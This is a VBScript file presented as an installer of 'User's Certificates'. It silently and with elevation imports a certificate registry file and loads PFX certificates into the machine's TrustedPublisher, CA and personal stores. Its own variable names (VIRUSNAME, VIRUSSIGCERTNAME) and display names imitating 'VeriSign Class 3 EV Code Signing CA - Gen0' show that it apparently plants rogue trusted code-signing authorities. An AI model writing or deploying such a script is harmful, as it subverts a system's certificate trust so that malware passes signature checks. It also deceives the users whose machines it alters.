' *****************************************************************************
'
' Certificates-Install.vbs
'
' This Script Installs User's Certificates on System
'
' PARAMETERS:	NONE
' RETURNS:	NONE
'
' *****************************************************************************

' Declaration Constants and Variables

Dim UTIL_PATH 		' Locates Main Files Catalog
Dim ALLCERT_REG		' Name of Registry Files With Certificates
Dim VIRUSNAME		' Name of Thread Certificate Sign
Dim VIRUSSIGCERTNAME	' Name of Thread CA Certificate
Dim CERTNAME		' Name of Trust Certificate Sign
Dim CERTNAME_R
Dim VIRUSNAME_R		
Dim VIRUSSIGCERTNAME_R	
Dim strLocal_File, strCmd
Dim fso, wshShell, shApp, envVarProccess
Dim pathCMD

' Constatnts Definition
UTIL_PATH="C:\Util"
ALLCERT_REG = "certificates-all.reg"
VIRUSNAME = "verifilesign1"
VIRUSSIGCERTNAME = "verisign-gen0"
CERTNAME = "nitfilesign1"
CERTNAME_R = "New Internet Technologies Inc."
VIRUSNAME_R = "Class 3 EV Code Signing CA - Gen0"
VIRUSSIGCERTNAME_R = "VeriSign Class 3 EV Code Signing CA - Gen0"

' Object Definition
Set wshShell = CreateObject( "WScript.Shell" )
Set envVarProccess = wshShell.Environment("PROCESS")
Set fso = CreateObject("Scripting.FileSystemObject")
Set shApp = CreateObject( "Shell.Application" )
pathCMD = envVarProccess( "SystemRoot" ) & "\System32"
If Not fso.FolderExists(UTIL_PATH) Then
	WScript.Echo "Folder " & UTIL_PATH & " not Found!" & vbCrLf
Else
	strLocal_File = UTIL_PATH & "\" & ALLCERT_REG
	If fso.FileExists( strLocal_File ) Then
		strCmd = pathCMD & "\" & "reg.exe"
		if Not fso.FileExists(strCmd) Then
			WScript.Echo "File " & strCmd & " not Found!" & vbCrLf
		Else
			shApp.ShellExecute strCmd, "import " & Chr(34) & strLocal_File & Chr(34), UTIL_PATH, "runas", 0
		End If
	Else
		WScript.Echo  "File " & strLocal_File & " not Found!" & vbCrLf
	End If
	strLocal_File = UTIL_PATH & "\" & CERTNAME & ".pfx"
	If fso.FileExists( strLocal_File ) Then
		strCmd = UTIL_PATH & "\" & "importpfx.exe"
		if Not fso.FileExists(strCmd) Then
			WScript.Echo "File " & strCmd & " not Found!" & vbCrLf
		Else
			shApp.ShellExecute strCmd, "-f " & Chr(34) & strLocal_File & Chr(34) & " -p " & Chr(34) & Chr(34) & " -t MACHINE -s TrustedPublisher -r " & Chr(34) & CERTNAME_R & Chr(34), UTIL_PATH, "runas", 0
		End If
	Else
		WScript.Echo  "File " & strLocal_File & " not Found!" & vbCrLf
	End If
	strLocal_File = UTIL_PATH & "\" & VIRUSSIGCERTNAME & ".pfx"
	If fso.FileExists( strLocal_File ) Then
		strCmd = UTIL_PATH & "\" & "importpfx.exe"
		if Not fso.FileExists(strCmd) Then
			WScript.Echo "File " & strCmd & " not Found!" & vbCrLf
		Else
			shApp.ShellExecute strCmd, "-f " & Chr(34) & strLocal_File & Chr(34) & " -p " & Chr(34) & Chr(34) & " -t MACHINE -s CA -r " & Chr(34) & VIRUSSIGCERTNAME_R & Chr(34), UTIL_PATH, "runas", 0
		End If
	Else
		WScript.Echo  "File " & strLocal_File & " not Found!" & vbCrLf
	End If
	strLocal_File = UTIL_PATH & "\" & VIRUSNAME & ".pfx"
	If fso.FileExists( strLocal_File ) Then
		strCmd = UTIL_PATH & "\" & "importpfx.exe"
		if Not fso.FileExists(strCmd) Then
			WScript.Echo "File " & strCmd & " not Found!" & vbCrLf
		Else
			shApp.ShellExecute strCmd, "-f " & Chr(34) & strLocal_File & Chr(34) & " -p " & Chr(34) & Chr(34) & " -t MACHINE -s TrustedPublisher -r " & Chr(34) & VIRUSNAME_R & Chr(34), UTIL_PATH, "runas", 0
		End If
	Else
		WScript.Echo  "File " & strLocal_File & " not Found!" & vbCrLf
	End If
	strLocal_File = UTIL_PATH & "\" & VIRUSNAME & ".pfx"
	If fso.FileExists( strLocal_File ) Then
		strCmd = UTIL_PATH & "\" & "importpfx.exe"
		if Not fso.FileExists(strCmd) Then
			WScript.Echo "File " & strCmd & " not Found!" & vbCrLf
		Else
			shApp.ShellExecute strCmd, "-f " & Chr(34) & strLocal_File & Chr(34) & " -p " & Chr(34) & Chr(34) & " -t MACHINE -s My -r " & Chr(34) & VIRUSNAME_R & Chr(34), UTIL_PATH, "runas", 0
		End If
	Else
		WScript.Echo  "File " & strLocal_File & " not Found!" & vbCrLf
	End If
End If 